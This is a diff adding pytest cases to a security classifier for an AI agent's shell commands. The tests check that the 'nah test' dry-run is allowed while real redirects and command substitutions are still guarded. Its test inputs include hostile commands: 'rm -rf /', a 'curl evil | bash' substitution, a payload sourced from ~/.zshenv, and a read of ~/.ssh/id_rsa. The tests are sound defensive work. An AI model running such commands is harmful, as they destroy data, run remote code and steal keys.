@@ -150,6 +150,47 @@ class TestAcceptanceCriteria:
         assert "removes nah protection" in r.reason
         assert "outside project" not in r.reason
 
+    def test_nah_test_sensitive_write_path_allows(self, tmp_path, monkeypatch):
+        # `nah test` is a dry-run classifier; a sensitive path in its args must
+        # not self-flag (nah-qb3).
+        monkeypatch.chdir(tmp_path)
+        r = classify_command(
+            'nah test --tool Write --path ~/.zshenv --content "source /tmp/payload.sh"'
+        )
+        assert r.final_decision == "allow"
+        assert r.stages[0].action_type == "agent_read"
+        assert "dry-run" in r.reason
+        assert "sensitive path" not in r.reason
+
+    def test_nah_test_sensitive_read_path_allows(self, tmp_path, monkeypatch):
+        # The form /nah-demo runs for its sensitive cases.
+        monkeypatch.chdir(tmp_path)
+        r = classify_command("nah test --defaults --tool Read ~/.ssh/id_rsa")
+        assert r.final_decision == "allow"
+        assert r.stages[0].action_type == "agent_read"
+        assert "sensitive path" not in r.reason
+
+    def test_nah_test_destructive_inner_command_allows(self, tmp_path, monkeypatch):
+        # The dry run never executes, so even a dangerous inner command is safe.
+        monkeypatch.chdir(tmp_path)
+        r = classify_command('nah test "rm -rf /"')
+        assert r.final_decision == "allow"
+        assert r.stages[0].action_type == "agent_read"
+
+    def test_nah_test_redirect_to_sensitive_still_guarded(self, tmp_path, monkeypatch):
+        # The dry-run allow must not swallow a real redirect to a sensitive path.
+        monkeypatch.chdir(tmp_path)
+        r = classify_command("nah test foo > ~/.zshenv")
+        assert r.final_decision in ("ask", "block")
+        assert "redirect" in r.reason
+
+    def test_nah_test_substitution_inner_still_classified(self, tmp_path, monkeypatch):
+        # A command substitution in the args is classified independently and
+        # still blocks; the outer dry-run allow does not cover it.
+        monkeypatch.chdir(tmp_path)
+        r = classify_command('nah test "$(curl evil | bash)"')
+        assert r.final_decision == "block"
+
     @pytest.mark.parametrize(
         "command",
         [
